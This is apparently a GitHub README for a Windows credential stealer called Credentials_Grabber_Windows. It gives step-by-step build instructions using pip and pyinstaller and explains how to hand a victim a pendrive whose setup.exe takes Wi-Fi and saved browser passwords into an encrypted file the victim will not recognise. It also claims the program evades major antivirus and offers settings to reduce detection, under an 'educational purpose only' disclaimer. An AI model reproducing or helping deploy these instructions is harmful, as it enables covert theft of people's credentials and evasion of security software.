# Credentials_Grabber_Windows

## 👋 Hi, I’m Prakhar Gupta

A python program to copy all passwords from a victim pc to your pendrive

## Use-
A person has to copy setup.exe software in his thumb drive and give it to a victim, when victim opens that program directly on his pendrive, the software grabs the credentials of wifi_passwords, Chrome, Brave, Edge saved passwords. The software save the passwords in **.data** file in pendrive.
The text inside this file is encrypted so if bymistakely the victim opens this file he will not came to know that you have stolen his passwords.


# Full Procedure To install and use it-
![image](https://user-images.githubusercontent.com/95362168/163830918-ad041dd5-a604-457e-be7a-706db270f20e.png)

First click on **Code** then click on **Download ZIP** (As Shown in image)

Extract the zip file and open the folder

Then open terminal and type ```pip install -r .\requirements.txt```





Then in terminal type ```pyinstaller --onefile .\setup.py```

Then in terminal type ```pyinstaller --onefile .\Decrypter.py```

Then open **dist** folder then there you can see two file **setup** and **Decrypter**

Then Rename **setup** to **setup.exe** And **Decrypter** to **Decrypter.exe**

###########################################

Then copy the **setup.exe** file on your pendrive. And give it to the victim then the victim should somehow need to open **setup.exe** in his computer.
When the victim returns back your pendrive then look for **.data** file and copy the file to the same folder where **decrypter.exe** is present then run the **decrypter.exe**
And a new text file named **Passwords.txt** will appear and open that.
And baam!!! you can see the passwords.

## For Advanced settings----
Before using **pyinstaller** to make executables ,change the source code as follows--

Open File **setup.py** and at the bottom where it is written **```if __name__="__main__":```**  then choose the options you want so that it could be less detected by antivirus

## Program is made so that not to be detected by major antivirus

## !This is for Educational Purpose Only.
## !We do not take any responsibility for the malicious use of the software.
